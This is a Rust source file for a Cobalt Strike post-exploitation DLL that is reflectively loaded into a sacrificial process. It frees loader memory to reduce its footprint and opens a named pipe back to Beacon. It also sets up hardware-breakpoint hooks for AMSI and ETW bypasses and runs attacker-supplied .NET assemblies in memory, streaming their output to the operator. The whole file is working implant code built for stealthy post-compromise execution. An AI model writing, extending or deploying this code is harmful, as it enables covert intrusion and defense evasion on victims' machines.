//! senjata-runner — UDPK postex DLL. Reflectively loaded by Cobalt Strike
//! into a sacrificial process via `beacon_execute_postex_job`.
//!
//! ABI contract (mirrors `arsenal-kit/kits/postex/base`):
//!
//! - Single exported entry point `DllEntryPoint(HMODULE, DWORD reason,
//!   LPVOID lpReserved, BOOL startNamedPipe)`. CS's reflective loader
//!   calls it twice: once with the standard `DLL_PROCESS_ATTACH` (1) so
//!   the linker-generated CRT thunks initialise, then again with the
//!   custom `DLL_POSTEX_ATTACH` (4) once the IAT has been smartinject-
//!   rewritten and the postex argument buffer is populated. Real work
//!   happens on the second call.
//!
//! - Two writable globals CS rewrites at load time:
//!   `gPostexArgumentsBuffer` (POSTEX_ARGUMENTS struct) and
//!   `gPipeName` (named-pipe path). Both must be byte-pattern-locatable
//!   and live in a writable section.
//!
//! - BeaconAPI functions (`BeaconOutput`, `BeaconPrintf`, …) appear in
//!   the IAT against `beacon.dll`; smartinject rewrites those entries to
//!   point at in-process proxies that forward to Beacon via the named
//!   pipe whose handle lives in `gPipeHandle`. The pipe MUST exist before
//!   any BeaconAPI call OR before `bread_pipe` runs operator-side —
//!   otherwise the operator sees `ERROR_FILE_NOT_FOUND (2)` and our
//!   orchestrator output is lost.
//!
//! Built as `cdylib` → produces a Windows DLL whose only externally
//! interesting export is `DllEntryPoint`.

#![no_std]
#![no_main]
#![cfg(target_os = "windows")]

extern crate alloc;

#[global_allocator]
static __ALLOC: rustbof::allocator::BeaconAlloc = rustbof::allocator::BeaconAlloc;

mod args;
mod beacon_api;
mod cleanup;
mod debug_log;
mod pipes;
mod postex;
mod streamer;

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}

use core::ffi::c_void;
use core::sync::atomic::{AtomicPtr, AtomicUsize, Ordering};

use windows_sys::Win32::Foundation::{BOOL, HANDLE, HMODULE};

// HMODULE / HANDLE are both type aliases for `*mut c_void` in windows-sys
// 0.59 — clippy flags the conversions, but the cast-through helps when
// we ever bump to a windows-sys major that strengthens these typedefs.
#[allow(clippy::unnecessary_cast)]
fn hmodule_to_void(h: HMODULE) -> *mut c_void { h as *mut c_void }
use windows_sys::Win32::System::SystemServices::{
    DLL_PROCESS_ATTACH, DLL_PROCESS_DETACH, DLL_THREAD_ATTACH, DLL_THREAD_DETACH,
};

use crate::postex::DLL_POSTEX_ATTACH;

/// HMODULE saved from `DLL_PROCESS_ATTACH`. Used by `CleanupLoaderMemory`
/// during `DLL_POSTEX_ATTACH` and held in static storage so the value
/// survives the LoaderLock-bracketed gap between the two calls.
static LOADED_DLL_BASE: AtomicPtr<c_void> = AtomicPtr::new(core::ptr::null_mut());

/// Streamer thread handle, threaded from the pipe-ready hook back to the
/// final join site so the reader drains every byte before we exit.
static STREAMER_THREAD: AtomicUsize = AtomicUsize::new(0);

/// CS UDPK reflective-loader entrypoint. Layout matches Arsenal Kit
/// `dllmain.cpp::DllEntryPoint`.
///
/// # Safety
/// Called by CS's reflective loader and CRT thunk. Standard DllMain
/// safety rules apply: do NOT touch BeaconAPI or any extern "C" import
/// during `DLL_PROCESS_ATTACH` — LoaderLock is held and smartinject
/// hasn't rewritten the IAT yet. All non-trivial work goes into the
/// `DLL_POSTEX_ATTACH` branch.
#[unsafe(no_mangle)]
pub unsafe extern "system" fn DllEntryPoint(
    h_module: HMODULE,
    ul_reason_for_call: u32,
    lp_reserved: *mut c_void,
    start_named_pipe: BOOL,
) -> BOOL {
    unsafe {
        debug_log::log_hex(b"[runner] DllEntryPoint reason=", ul_reason_for_call);
        debug_log::log_hex(b"[runner]   hModule_lo=", h_module as usize as u32);
        debug_log::log_hex(b"[runner]   lpReserved_lo=", lp_reserved as usize as u32);
        debug_log::log_hex(b"[runner]   startNamedPipe=", start_named_pipe as u32);
        match ul_reason_for_call {
            DLL_PROCESS_ATTACH => {
                debug_log::log(b"[runner] DLL_PROCESS_ATTACH branch");
                LOADED_DLL_BASE.store(hmodule_to_void(h_module), Ordering::Relaxed);
            }
            DLL_THREAD_ATTACH | DLL_THREAD_DETACH | DLL_PROCESS_DETACH => {
                debug_log::log(b"[runner] DLL_THREAD_* or PROCESS_DETACH (ignored)");
            }
            r if r == DLL_POSTEX_ATTACH => {
                debug_log::log(b"[runner] DLL_POSTEX_ATTACH branch entered");
                run_postex(h_module, lp_reserved, start_named_pipe != 0);
                // run_postex never returns — postex_exit calls ExitProcess.
            }
            _ => {
                debug_log::log_hex(b"[runner] UNKNOWN reason ", ul_reason_for_call);
            }
        }
        1 // TRUE
    }
}

/// Real postex work — runs in the second `DllEntryPoint` call. Never
/// returns; reaches `postex_exit` which calls ExitProcess/ExitThread.
unsafe fn run_postex(h_module: HMODULE, lp_reserved: *mut c_void, start_named_pipe: bool) -> ! {
    unsafe {
        debug_log::log(b"[runner] run_postex: entered");

        // 1. Snapshot POSTEX_ARGUMENTS — CS UDRL wrote this in just
        //    before invoking us.
        let pa = postex::read_postex_arguments();
        debug_log::log_hex(b"[runner] PA.exit_func=", pa.exit_func);
        debug_log::log_hex(b"[runner] PA.cleanup_loader=", pa.cleanup_loader as u32);
        debug_log::log_hex(b"[runner] PA.user_args_size=", pa.user_argument_buffer_size as u32);
        let user_args_size = pa.user_argument_buffer_size;
        let user_args_ptr = if user_args_size > 0 && !lp_reserved.is_null() {
            lp_reserved
        } else {
            core::ptr::null_mut()
        };

        // 2. Best-effort loader cleanup (so the only resident allocation
        //    is our heap + smartinject's proxies).
        if pa.cleanup_loader > 0 {
            debug_log::log(b"[runner] step 2: cleanup_loader_memory");
            let base = LOADED_DLL_BASE.load(Ordering::Relaxed);
            let cleanup_target = if !base.is_null() { base } else { hmodule_to_void(h_module) };
            // Ignore return value — failure just leaves the loader pages
            // resident; not fatal.
            let _ = postex::cleanup_loader_memory(cleanup_target);
        }

        // 3. Start the named pipe server BEFORE anything else can call
        //    BeaconAPI. Operator-side `bread_pipe` connects to this pipe;
        //    smartinject proxies write to it; our streamer writes to it.
        //    If this fails we still try to run — orchestrator output gets
        //    lost but a hard exit is worse.
        debug_log::log_hex(b"[runner] step 3: startNamedPipe=", start_named_pipe as u32);
        if start_named_pipe {
            debug_log::log(b"[runner]   calling start_named_pipe_server");
            let ok = pipes::start_named_pipe_server();
            debug_log::log_hex(b"[runner]   start_named_pipe_server returned=", ok as u32);
        }

        // 4. Parse orchestrator args from the user-arg buffer.
        let parsed = match args::parse(user_args_ptr, user_args_size as usize) {
            Ok(a) => a,
            Err(_e) => {
                beacon_api::output(
                    beacon_api::CALLBACK_ERROR,
                    b"[runner] args parse failed\n",
                );
                postex::postex_exit(start_named_pipe, pa.exit_func);
            }
        };

        // 5. Initialise HWBP engine for the orchestrator's bypass installers.
        let engine = match opsec_hwbp::HwbpEngine::init() {
            Ok(e) => e,
            Err(_) => {
                beacon_api::output(
                    beacon_api::CALLBACK_ERROR,
                    b"[runner] hwbp init failed\n",
                );
                postex::postex_exit(start_named_pipe, pa.exit_func);
            }
        };

        // 6. Build the orchestrator input.
        let input = clr_orchestrator::OrchestrateInput {
            app_domain: &parsed.app_domain,
            amsi: parsed.amsi,
            etw: parsed.etw,
            mailslot: parsed.mailslot,
            entry_point: parsed.entry_point,
            slot_name: &parsed.slot_name,
            pipe_name: &parsed.pipe_name,
            asm_args: &parsed.asm_args,
            mode: parsed.mode,
            main_name: &parsed.main_name,
            asm_bytes: &parsed.asm_bytes,
        };

        // 7. Streaming orchestrate. The pipe-ready hook captures the
        //    orchestrator's internal pipe read handle and spawns a
        //    reader thread that forwards bytes to BeaconOutput live.
        unsafe extern "C" fn pipe_ready_thunk(read_handle: HANDLE, _ctx: *mut c_void) {
            unsafe {
                let h = streamer::spawn(read_handle);
                STREAMER_THREAD.store(h as usize, Ordering::Relaxed);
            }
        }

        let result = clr_orchestrator::orchestrate_streaming(
            &input,
            &engine,
            pipe_ready_thunk,
            core::ptr::null_mut(),
        );

        // 8. Drain the streamer thread before exit so the last chunk of
        //    output isn't truncated when our process dies.
        let thread_handle: HANDLE = STREAMER_THREAD.load(Ordering::Relaxed) as HANDLE;
        streamer::join(thread_handle);

        match result {
            Ok(()) => beacon_api::output(beacon_api::CALLBACK_OUTPUT, b"[runner] done\n"),
            Err(e) => {
                let msg = e.format();
                beacon_api::output(beacon_api::CALLBACK_ERROR, msg.as_bytes());
                beacon_api::output(beacon_api::CALLBACK_ERROR, b"\n");
            }
        }

        // 9. Exit per PostexArguments::ExitFunc.
        postex::postex_exit(start_named_pipe, pa.exit_func);
    }
}

/// Backstop the linker won't optimise away. References the two globals
/// CS needs to find by byte pattern. `#[used]` on a `static` of named
/// function-pointer type keeps LLVM honest under aggressive LTO.
type AnchorFn = fn() -> *const u8;

#[used]
static _ANCHOR: [AnchorFn; 2] = [postex::buffer_addr, pipe_name_addr];

fn pipe_name_addr() -> *const u8 {
    core::ptr::addr_of!(pipes::gPipeName) as *const u8
}
